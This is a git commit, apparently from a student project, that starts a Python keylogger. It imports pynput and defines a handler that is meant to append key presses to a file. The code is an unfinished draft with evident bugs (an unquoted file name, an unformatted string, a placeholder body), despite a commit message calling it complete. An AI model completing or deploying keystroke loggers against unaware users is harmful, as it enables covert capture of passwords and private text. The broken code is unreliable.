e1f4c019e773df46a2baedf9c520c7add296edb2
Alyssa Chiego <abmccurdy7151@eagle.fgcu.edu>
2024-07-25 00:25:43 -0400

    Body of main function complete

--- keylogger.py
+++ keylogger.py
@@ -1,1 +1,13 @@
 from pynput import keyboard
+
+# prints typed key in terminal
+def keyPressed(key):
+    # {0} refers to (key)
+    print("{0} pressed")
+    # use 'a' bc we need to create new file if not exist already
+    #   & we need file open for writing
+    with open(keylogger.txt, 'a') as keyLog:
+        try:
+            print("Code Here")
+        except:
+             print("ERROR")
